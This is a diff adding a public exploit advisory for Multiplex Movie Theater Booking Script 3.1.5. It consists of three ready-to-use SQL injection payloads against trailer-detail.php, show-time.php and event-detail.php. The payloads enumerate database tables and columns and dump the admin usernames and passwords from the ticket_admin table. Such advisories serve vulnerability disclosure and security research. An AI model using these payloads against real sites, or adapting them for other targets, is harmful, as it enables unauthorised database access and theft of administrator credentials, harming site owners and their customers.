@@ -1,0 +1,39 @@
+# # # # # 
+# Exploit Title: Multiplex Movie Theater Booking Script 3.1.5 - SQL Injection
+# Dork: N/A
+# Date: 09.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/multiplex-theater-booking-script/
+# Version: 3.1.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/trailer-detail.php?moid=[SQL]
+# 
+# -122'++UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x),13,14,15,16,17,18,19,20,21,22,23--+-
+# 
+# 
+# 2)
+# http://localhost/[PATH]/show-time.php?moid=[SQL]
+# 
+# -102'++UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x7469636b65745f61646d696e)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR+1,2,0x30),0x3a20,column_name,0x3c62723e)))))x),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23))--+-
+# 
+# 
+# 3)
+# http://localhost/[PATH]/event-detail.php?eid=[SQL]
+# 
+# -45'++UNION+SELECT+1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(ticket_admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,admin_user,admin_pass,0x3c62723e))))x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-
+# 
+# 
+# # # # #
